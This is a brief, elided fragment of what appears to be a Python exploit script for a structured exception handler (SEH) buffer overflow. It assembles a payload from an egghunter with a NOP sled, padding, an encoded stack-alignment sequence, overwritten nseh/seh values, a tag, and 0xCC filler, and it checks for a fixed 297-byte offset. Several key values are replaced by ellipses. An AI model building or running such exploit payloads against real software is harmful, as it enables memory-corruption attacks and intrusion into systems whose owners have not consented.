...
aligner = (
        ...
        '\x2D\x41\x53\x55\x55\x2D\x46\x53\x55\x55\x2D\x42\x53\x55\x55'
...
if offset_len != 297:
    ...
    print(offset_len)
    exit(1)
payload = egghunter_nop_sled + egghunter + ('A' * 73) + aligner + ('A' * 20) + nseh + seh + ('D' * 10) + tag + ('\xCC'*(
    4068 - len(egghunter_nop_sled) - len(egghunter) - 93 - len(aligner) - len(nseh) - len(seh) - 10 - len(tag)))
